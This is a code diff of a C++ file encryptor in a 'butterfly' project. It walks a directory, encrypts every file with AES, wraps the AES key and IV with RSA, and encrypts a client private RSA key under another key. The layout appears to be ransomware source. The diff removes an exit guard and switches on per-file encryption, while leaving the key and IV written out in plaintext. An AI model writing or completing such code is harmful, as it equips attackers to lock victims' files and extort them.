@@ -37,21 +37,20 @@ void Encryptor::invokeDir(const std::string &path)
         // If --protect is enabled
         std::string aeskey = _aesEncryptor->getAESKey();
         std::string aesiv = _aesEncryptor->getAESIv();
-        //std::string aeskeyabc = "abc";
-        //std::string aesivabc = "def";
+
         butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
         butterfly::writeBinFile("AESIV.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
-        exit(1);
+
         for (auto &file: files)
         {
             LOG_TRACE("FILE: " << file);
-            //encryptFileWithAES(file.string());
+            encryptFileWithAES(file.string());
         }
 
         // Save the final AESKey.bin file
-        encryptFinalAESKeyWithRSA(_aesEncryptor->getAESKey(), "AESKey.bin");
+        //encryptFinalAESKeyWithRSA(aeskey, butterfly::ENC_AESKEY_FILENAME, butterfly::ENC_AESKEY_FILENAME);
         // Save the final AESIV.bin file
-        encryptFinalAESKeyWithRSA(_aesEncryptor->getAESIv(), "AESIV.bin");
+        //encryptFinalAESKeyWithRSA(aesiv, butterfly::ENC_AESIV_FILENAME, butterfly::ENC_AESIV_FILENAME);
 
     }
 
@@ -61,13 +60,13 @@ void Encryptor::encryptCPrivateRSA()
 {
     // Get the CPrivateRSA.pem file string
     std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
-    //writeBinFile("CPrivateRSA.pem", cPrivateRSAStr.c_str(), static_cast<long>(cPrivateRSAStr.length()));
+
     EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();
 
     try
     {
         // Encrypt the CPrivateRSA.pem file string
-        _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr.substr(0, cPrivateRSAStr.size() - 1));
+        _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::ENC_CPRIVATERSA_FILENAME);
         // Get the encrypted CPrivateRSA.pem string
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
@@ -95,13 +94,13 @@ void Encryptor::encryptFileWithAES(const std::string &filepath)
 
 }
 
-void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename)
+void Encryptor::encryptFinalAESKeyWithRSA(const std::string aesKeyStr, const std::string filename, const std::string &type)
 {
 
     try
     {
         // Encrypt the AES Key String
-        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);
+        _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr, type);
         // Get the encrypted AES Key String
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
         // Save the encrypted AES Key to AESKey.bin
